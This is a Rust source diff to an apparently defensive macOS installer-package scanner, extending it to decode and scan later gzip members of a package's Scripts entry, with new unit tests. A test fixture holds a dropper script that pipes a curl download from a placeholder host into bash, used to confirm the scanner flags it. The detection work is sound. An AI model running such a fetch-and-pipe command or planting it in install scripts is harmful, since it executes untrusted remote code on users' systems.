@@ -291,7 +291,7 @@ fn scan_scripts_entry(
     // An entry we can't reach (bounded read stopped short) is
     // unreadable, not absent. A partial read is scanned, then reported
     // unreadable below.
-    let (mut raw, mut gap) = budget
+    let (mut raw, mut gap, heap_rest) = budget
         .read_entry_partial_nested(content, archive, entry)
         .map_err(|_| RuleOutcome::NotApplicable)?;
 
@@ -300,6 +300,7 @@ fn scan_scripts_entry(
     // already undid the entry's encoding. A gzip stream that stops early is
     // scanned as far as it decoded, plus, raw, the input it never reached
     // (stored-block text past a limit, plaintext behind a broken header).
+    let mut later = Vec::new();
     let archive_bytes = if !crate::inflate::has_gzip_magic(&raw) {
         raw
     } else {
@@ -312,7 +313,12 @@ fn scan_scripts_entry(
         };
         budget.charge(v.len());
         match result {
-            Ok(()) => v,
+            Ok(()) => {
+                // The trailer (CRC-32, ISIZE) follows the consumed input.
+                let rest = raw.get(used.saturating_add(8)..).unwrap_or_default();
+                later = decode_later_members(rest, budget);
+                v
+            }
             Err(e) => {
                 gap.get_or_insert(xar::XarEntryError::Undecodable(e));
                 raw.drain(..used.min(raw.len()));
@@ -329,18 +335,85 @@ fn scan_scripts_entry(
         }
     };
 
-    let Some(members) = cpio::parse(&archive_bytes, &cpio::CpioLimits::default()) else {
-        // Something is in there, but not in a shape we can read: scan it raw.
-        findings.scan(label, archive_bytes, "install scripts (unparsed)");
-        return Err(RuleOutcome::NotApplicable);
+    let result = match cpio::parse(&archive_bytes, &cpio::CpioLimits::default()) {
+        // Members that did parse, plus one cut off mid-body, are scanned even
+        // when the archive is incomplete.
+        Some(members) => {
+            scan_cpio_members(ctx, entry, &members, "", findings);
+            if members.is_complete() && gap.is_none() {
+                Ok(())
+            } else {
+                Err(RuleOutcome::NotApplicable)
+            }
+        }
+        None => {
+            // Something is in there, but not in a shape we can read: scan it raw.
+            findings.scan(label.clone(), archive_bytes, "install scripts (unparsed)");
+            Err(RuleOutcome::NotApplicable)
+        }
     };
-    // Members that did parse, plus one cut off mid-body, are scanned even
-    // when the archive is incomplete.
-    let complete = members.is_complete() && gap.is_none();
+    // A gzip entry's own later members, after those of a gzip inside it.
+    later.extend(decode_later_members(heap_rest, budget));
+    scan_later_members(ctx, entry, label, later, findings);
+    result
+}
 
+/// Decodes the gzip members after the first, joined as `gunzip` joins them,
+/// under the current entry's allowance. Stops at bytes that do not start a
+/// member, or at a member that fails, keeping what that member decoded.
+fn decode_later_members(mut rest: &[u8], budget: &mut xar::ReadBudget) -> Vec<u8> {
+    let mut out = Vec::new();
+    while crate::inflate::has_gzip_magic(rest) && budget.entry_cap() > 0 {
+        let (v, used, result) = crate::inflate::gzip_decompress_consumed(rest, budget.entry_cap());
+        budget.charge(v.len());
+        out.extend_from_slice(&v);
+        if result.is_err() {
+            break;
+        }
+        rest = rest.get(used.saturating_add(8)..).unwrap_or_default();
+    }
+    out
+}
+
+/// Scans what [`decode_later_members`] returned: as cpio members if it parses,
+/// raw otherwise. Installer never runs these (#109), so nothing here makes the
+/// entry unreadable; a script from the first member can still extract them.
+fn scan_later_members(
+    ctx: &ScanContext,
+    entry: &xar::XarFile,
+    label: String,
+    later: Vec<u8>,
+    findings: &mut ScriptFindings,
+) {
+    if later.is_empty() {
+        return;
+    }
+    match cpio::parse(&later, &cpio::CpioLimits::default()) {
+        Some(members) => scan_cpio_members(ctx, entry, &members, LATER_MEMBER_NOTE, findings),
+        None => findings.scan(
+            label,
+            later,
+            "install scripts (later gzip member, unparsed)",
+        ),
+    }
+}
+
+/// Description note for a script found in a `Scripts` gzip member after the
+/// first, which Installer does not extract.
+const LATER_MEMBER_NOTE: &str = " (later gzip member, not run by Installer)";
+
+/// Scans each non-empty regular member of `members`, including one cut off
+/// mid-body, labelled `install script {name}{note}`.
+fn scan_cpio_members(
+    ctx: &ScanContext,
+    entry: &xar::XarFile,
+    members: &cpio::CpioArchive,
+    note: &str,
+    findings: &mut ScriptFindings,
+) {
     let parsed = members.entries.iter().map(|m| (m, ""));
     let cut = members.cut_short.iter().map(|m| (m, " (cut short)"));
-    for (member, note) in parsed.chain(cut) {
+    for (member, cut_note) in parsed.chain(cut) {
         if !member.is_regular_file() || member.data.is_empty() {
             continue;
         }
@@ -348,13 +421,8 @@ fn scan_scripts_entry(
         findings.scan(
             label,
             member.data.to_vec(),
-            &format!("install script {}{note}", member.name),
+            &format!("install script {}{note}{cut_note}", member.name),
         );
-    }
-    if complete {
-        Ok(())
-    } else {
-        Err(RuleOutcome::NotApplicable)
     }
 }
 
@@ -1798,6 +1866,116 @@ mod tests {
             signal.description
         );
         assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// A complete gzip member of one stored block holding `inner`.
+    fn gzip_member(inner: &[u8]) -> Vec<u8> {
+        let n = u16::try_from(inner.len()).expect("one stored block");
+        let mut v = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3, 1];
+        v.extend_from_slice(&n.to_le_bytes());
+        v.extend_from_slice(&(!n).to_le_bytes());
+        v.extend_from_slice(inner);
+        v.extend_from_slice(&crate::inflate::crc32(inner).to_le_bytes());
+        v.extend_from_slice(&(inner.len() as u32).to_le_bytes());
+        v
+    }
+
+    /// A complete odc cpio archive of one regular file.
+    fn cpio_one(name: &str, body: &[u8]) -> Vec<u8> {
+        let mut v = odc_member(name, body);
+        v.extend(odc_member("TRAILER!!!", b""));
+        v
+    }
+
+    const SCRIPT_DROPPER: &[u8] =
+        b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n";
+
+    /// `gzip(benign preinstall) ‖ later`, stored and zlib on the heap.
+    fn later_member_pkgs(later: &[u8]) -> [Vec<u8>; 2] {
+        let mut blob = gzip_member(&cpio_one("preinstall", b"echo hi\n"));
+        blob.extend_from_slice(later);
+        [
+            pkg_with_scripts(&blob),
+            pkg_with_scripts(&zlib_stored(&blob)),
+        ]
+    }
+
+    /// Installer runs only the first member (#109); a later one is still
+    /// scanned, and is not a reason to report the entry unreadable.
+    #[test]
+    fn a_later_gzip_member_is_scanned_without_marking_incomplete() {
+        let mut later = gzip_member(&cpio_one("postinstall", SCRIPT_DROPPER));
+        later.extend(gzip_member(&cpio_one("other", b"echo hi\n")));
+        for pkg in later_member_pkgs(&later) {
+            let c = ctx("s.pkg", &pkg);
+            let signal = InstallerScriptRule
+                .evaluate(&c)
+                .expect("evaluates")
+                .expect("the later member scores");
+            assert!(
+                signal.description.contains(
+                    "install script postinstall (later gzip member, not run by Installer)"
+                ),
+                "{}",
+                signal.description
+            );
+            assert!(!c.marked_incomplete("installer-script-suspicious"));
+        }
+    }
+
+    /// The members after the first are joined, as `gunzip` joins them, so a
+    /// cpio split across two of them is read whole.
+    #[test]
+    fn later_gzip_members_are_joined_before_cpio_parsing() {
+        let cpio = cpio_one("postinstall", SCRIPT_DROPPER);
+        let (a, b) = cpio.split_at(40);
+        let mut later = gzip_member(a);
+        later.extend(gzip_member(b));
+        for pkg in later_member_pkgs(&later) {
+            let c = ctx("s.pkg", &pkg);
+            let signal = InstallerScriptRule.evaluate(&c).expect("evaluates");
+            assert!(signal
+                .expect("scores")
+                .description
+                .contains("install script postinstall (later gzip member"));
+        }
+    }
+
+    /// A damaged, non-cpio or non-gzip tail is evidence only: scanned as far
+    /// as it goes, never `Partial` (#109).
+    #[test]
+    fn a_damaged_later_member_is_scanned_but_not_incomplete() {
+        let cut = |v: Vec<u8>| v[..v.len() - 8].to_vec();
+        let benign = cpio_one("postinstall", b"echo hi\n");
+        for later in [
+            cut(gzip_member(&benign)),
+            gzip_member(b"plain text, not cpio\n"),
+            b"trailing junk".to_vec(),
+        ] {
+            for pkg in later_member_pkgs(&later) {
+                let c = ctx("s.pkg", &pkg);
+                assert!(matches!(InstallerScriptRule.evaluate(&c), Ok(None)));
+            }
+        }
+
+        let dropper = cpio_one("postinstall", SCRIPT_DROPPER);
+        for (later, note) in [
+            (cut(gzip_member(&dropper)), "(later gzip member"),
+            (
+                gzip_member(SCRIPT_DROPPER),
+                "install scripts (later gzip member, unparsed)",
+            ),
+        ] {
+            for pkg in later_member_pkgs(&later) {
+                let c = ctx("s.pkg", &pkg);
+                let signal = InstallerScriptRule
+                    .evaluate(&c)
+                    .expect("evaluates")
+                    .expect("scores");
+                assert!(signal.description.contains(note), "{}", signal.description);
+                assert!(!c.marked_incomplete("installer-script-suspicious"));
+            }
+        }
     }
 
     #[test]
